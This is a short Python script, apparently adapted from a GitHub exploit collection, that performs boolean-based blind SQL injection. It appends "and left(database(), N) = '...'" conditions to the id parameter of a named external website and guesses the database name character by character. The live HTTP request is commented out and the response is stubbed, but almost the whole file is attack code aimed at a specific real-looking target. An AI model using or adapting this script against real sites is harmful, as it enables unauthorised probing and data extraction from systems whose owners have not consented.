#encoding=utf-8
from urllib import request

# https://github.com/backlion/exp-for-python/blob/master/%E7%9B%B2%E6%B3%A8.py
data = {}
def http_conn(url):
    url_test = 'http://web3.17500.cn/800/nr.php?id=27' + url
    print(url_test)
    # req = request.urlopen(url_test)

    # html_doc = req.read()
    html_doc = 'test'
    if html_doc.find('2010069') > 0:
        return True
    else:
        return False

database = 'c'

payloads = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.')

for i in range(2, 10, 1):
    for payload in payloads:
        url = " and left(database(), %s) = '%s' " % (i, (database + payload))
        print(url)

        if http_conn(url) == True:
            database += payload
            print("current database: " + database)

            break